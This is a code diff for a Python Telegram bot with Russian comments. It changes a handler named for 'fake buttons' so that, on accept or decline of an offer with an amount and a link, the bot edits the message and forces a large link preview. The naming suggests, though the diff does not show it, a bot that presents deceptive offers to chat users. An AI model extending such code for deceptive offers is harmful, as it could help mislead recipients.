@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- ОБРАБОТКА КНОПОК ---
+# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -157,16 +157,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
-    # 1. Пытаемся удалить старое сообщение (в отдельном try, чтобы ошибка удаления не сломала отправку)
-    try:
-        if business_connection_id:
-            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
-        else:
-            await callback.message.delete()
-    except Exception as e:
-        print(f"Не удалось удалить старое сообщение: {e}")
-
-    # 2. Формируем текст и кнопки
     if action == "accept":
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -176,26 +166,38 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
 
-    # 3. Пытаемся отправить новое сообщение
+    # Собираем аргументы для редактирования
+    kwargs = {
+        "chat_id": callback.message.chat.id,
+        "message_id": callback.message.message_id,
+        "text": new_text,
+        "reply_markup": new_keyboard,
+        "parse_mode": "HTML",
+        # Вот тут мы принудительно просим Telegram оставить/отрисовать анимацию!
+        "link_preview_options": LinkPreviewOptions(
+            url=link,
+            show_above_text=True,
+            prefer_large_media=True
+        )
+    }
+    
+    if business_connection_id: 
+        kwargs["business_connection_id"] = business_connection_id
+
     try:
-        kwargs = {
-            "chat_id": callback.message.chat.id, 
-            "text": new_text, 
-            "reply_markup": new_keyboard, 
-            "parse_mode": "HTML",
-            "link_preview_options": LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
-        }
-        
-        if business_connection_id: kwargs["business_connection_id"] = business_connection_id
-        
-        await bot.send_message(**kwargs)
+        # Пытаемся отредактировать
+        await bot.edit_message_text(**kwargs)
         await callback.answer()
+    except TelegramBadRequest as e:
+        error_msg = str(e).lower()
+        if "message is not modified" in error_msg:
+            await callback.answer("Сообщение уже обработано.", show_alert=True)
+        else:
+            print(f"Ошибка редактирования: {e}")
+            await callback.answer("Не удалось изменить сообщение.", show_alert=True)
     except Exception as e:
-        print(f"Ошибка при отправке нового сообщения: {e}")
-        await callback.answer("Ошибка отправки", show_alert=True)
-        if ADMIN_ID:
-            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка при нажатии кнопки:</b>\n<code>{e}</code>", parse_mode="HTML")
-            except: pass
+        print(f"Неизвестная ошибка: {e}")
+        await callback.answer("Ошибка", show_alert=True)
 
 async def main():
     print("Бот запущен...")
